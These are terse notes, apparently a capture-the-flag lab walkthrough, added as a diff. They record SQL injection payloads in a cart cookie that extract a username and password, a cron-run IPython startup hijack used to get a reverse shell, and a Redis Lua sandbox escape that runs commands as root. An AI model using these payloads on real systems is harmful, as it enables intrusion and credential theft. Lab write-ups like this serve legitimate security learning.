@@ -1,0 +1,53 @@
+One of the great box
+
+look for ==subdomain==
+
+on doing checkout we are redirected to checkout subdomain with cokoie
+
+it was in ==b64 so we did it in json== and did
+
+```
+custom_cart={"B4GTLMT3":"2"}
+we put '    -> custom_cart={"B4GTLMT3'":"2"}   #showed 0 in cart means vuln
+custom_cart={"B4GTLMT3'-- -":"2"}   #showed 2 agian which means we good
+check for columns ->   custom_cart={"B4GTLMT3'union select 1,2,3 -- -":"2"} it returned 2 again means good
+custom_cart={"B4'union select 1,user(),3 -- -":"2"}  ->  got our username 
+custom_cart={"B4' union select 1,username,322 from checkout.user where id=1-- -":"2"}   -> guessed tb name and got username
+custom_cart={"B4' union select 1,password,322 from checkout.user where id=1-- -":"2"}  -> password
+```
+
+BEST ==SQLI==
+
+now we got in
+
+==pspy== .. told us ==ipython== running as cron and told us the path which was /opt/some
+
+we ==cant write== there but we ==can copy ==
+
+make required dir in /dev/shm with proper permission and ==cp -R /  in opt==
+
+```
+mkdir -m 777 /opt/scripts_review/profile_default/startup   -> set permission and it was required to be same
+now make any python file  with payload noral from rvshells
+and cp -R / in opt and got shell
+```
+
+now root
+
+doing ==ps -ef==
+
+==redis==-cli was running as root
+
+need auth
+
+we were ==sysadmin so check groups==
+
+`find / -group sysadmin 2>/dev/null`
+
+it make connection on localhost .. dwld it and set up nc on req port got creds
+
+now type this to get root shell
+
+```
+eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
+```
